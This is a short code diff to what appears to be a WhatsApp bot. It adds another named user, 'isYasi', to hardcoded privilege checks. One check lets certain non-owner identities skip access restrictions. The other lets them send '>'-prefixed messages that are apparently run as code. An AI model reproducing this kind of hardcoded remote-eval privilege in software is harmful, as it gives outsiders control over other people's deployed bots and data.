@@ -229,8 +229,8 @@ await conn.sendMessage(from, { react: { text: '🎀', key: mek.key } });
     }
 	}
 
-if (!isMe && !isSachintha && !isSavi && !isSadas && !isMani && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
-if (!isMe && !isSachintha && !isSavi && !isSadas && !isMani && !isOwner && config.ONLY_ME == 'true') return 
+if (!isMe && !isSachintha && !isSavi && !isSadas && !isMani && !isYasi && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
+if (!isMe && !isSachintha && !isSavi && !isSadas && !isMani && !isYasi && !isOwner && config.ONLY_ME == 'true') return 
 //==================================plugin map================================
 const events = require('./command')
 const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
@@ -269,7 +269,7 @@ reply(from)
 break
 
 default:				
-if ((isOwner || isSachintha || isSavi || isSadas || isMani || isMe) && body.startsWith('>')) {
+if ((isOwner || isSachintha || isSavi || isSadas || isMani || isYasi || isMe) && body.startsWith('>')) {
 let bodyy = body.split('>')[1]
 let code2 = bodyy.replace("°", ".toString()");
 try {
